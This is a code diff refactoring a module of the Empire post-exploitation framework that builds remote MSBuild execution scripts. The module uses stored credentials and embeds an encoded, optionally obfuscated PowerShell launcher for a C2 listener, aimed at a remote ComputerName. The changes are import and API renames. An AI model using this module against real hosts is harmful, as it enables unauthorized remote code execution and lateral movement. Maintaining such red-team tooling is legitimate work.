@@ -1,13 +1,10 @@
 from __future__ import print_function
 
-import pathlib
 from builtins import object, str
 from typing import Dict
 
-from empire.server.common import helpers
-from empire.server.common.module_models import PydanticModule
-from empire.server.database.models import Credential
-from empire.server.utils import data_util
+from empire.server.core.db.models import Credential
+from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
@@ -15,12 +12,11 @@ class Module(object):
     @staticmethod
     def generate(
         main_menu,
-        module: PydanticModule,
+        module: EmpireModule,
         params: Dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
-
         # staging options
         listener_name = params["Listener"]
         command = params["Command"]
@@ -34,7 +30,7 @@ class Module(object):
         launcher_obfuscate_command = params["ObfuscateCommand"]
 
         # read in the common module source code
-        script, err = main_menu.modules.get_module_source(
+        script, err = main_menu.modulesv2.get_module_source(
             module_name=module.script_path,
             obfuscate=obfuscate,
             obfuscate_command=obfuscation_command,
@@ -46,7 +42,6 @@ class Module(object):
         script_end = "Invoke-ExecuteMSBuild"
         cred_id = params["CredID"]
         if cred_id != "":
-
             if not main_menu.credentials.is_credential_valid(cred_id):
                 return handle_error_message("[!] CredID is invalid!")
 
@@ -71,14 +66,13 @@ class Module(object):
             # not a valid listener, return nothing for the script
             return handle_error_message("[!] Invalid listener: " + listener_name)
         elif listener_name:
-
             # generate the PowerShell one-liner with all of the proper options set
             launcher = main_menu.stagers.generate_launcher(
                 listenerName=listener_name,
                 language="powershell",
                 encode=True,
                 obfuscate=launcher_obfuscate,
-                obfuscationCommand=launcher_obfuscate_command,
+                obfuscation_command=launcher_obfuscate_command,
                 userAgent=user_agent,
                 proxy=proxy,
                 proxyCreds=proxy_creds,
@@ -92,7 +86,6 @@ class Module(object):
         else:
             Cmd = command.replace('"', '`"').replace("$", "`$")
             script = script.replace("LAUNCHER", Cmd)
-            print(helpers.color("[*] Running command:  " + command))
 
         # add any arguments to the end execution of the script
         script_end += " -ComputerName " + params["ComputerName"]
@@ -114,7 +107,7 @@ class Module(object):
 
         script_end += " | Out-String"
 
-        script = main_menu.modules.finalize_module(
+        script = main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
